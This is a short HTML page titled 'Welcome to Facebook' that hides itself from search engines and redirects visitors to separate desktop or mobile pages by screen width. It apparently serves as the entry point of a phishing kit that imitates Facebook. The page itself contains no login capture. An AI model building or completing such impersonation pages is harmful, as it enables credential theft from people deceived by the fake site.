<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Welcome to Facebook</title>

	<meta name="robots" content="noindex">
	<meta name="googlebot" content="noindex">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js" class="showscr"></script>

	<script>
		$(document).ready(function(){
			var width = $(window).width();
			if(width > 768){
				window.location = "Desktop/index.html";
			}
			else{
				window.location = "Mobile/index.html";
			}
		});
	</script>
</head>
<body>
	
</body>
</html>